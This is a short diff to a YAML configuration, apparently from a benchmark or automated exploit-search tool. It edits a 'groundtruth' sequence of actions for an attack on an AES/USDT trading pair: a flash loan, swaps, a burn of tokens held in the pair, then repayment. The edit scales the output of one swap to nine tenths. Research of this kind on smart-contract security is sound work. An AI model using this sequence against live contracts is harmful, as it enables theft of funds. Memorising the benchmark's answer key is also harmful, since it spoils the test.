@@ -37,7 +37,7 @@ groundtruth:
   - ["borrow", "usdt", "owner", "100000e18"]
   - ["swap", "pair", "attacker", "usdt", "aes", "usdt.balanceOf(attacker)", "pair.getAmountOut(usdt.balanceOf(attacker), address(usdt))"]
   - ["burn", "aes", "pair", "0"]
-  - ["swap", "pair","attacker", "aes", "usdt", "aes.balanceOf(attacker)", "pair.getAmountOut(aes.balanceOf(attacker), address(aes))"]
+  - ["swap", "pair","attacker", "aes", "usdt", "aes.balanceOf(attacker)", "pair.getAmountOut(aes.balanceOf(attacker), address(aes)) * 9 / 10"]
   - ["payback", "usdt", "owner", "100000e18 * 1003 / 1000"]
 
 # Information for search space building.
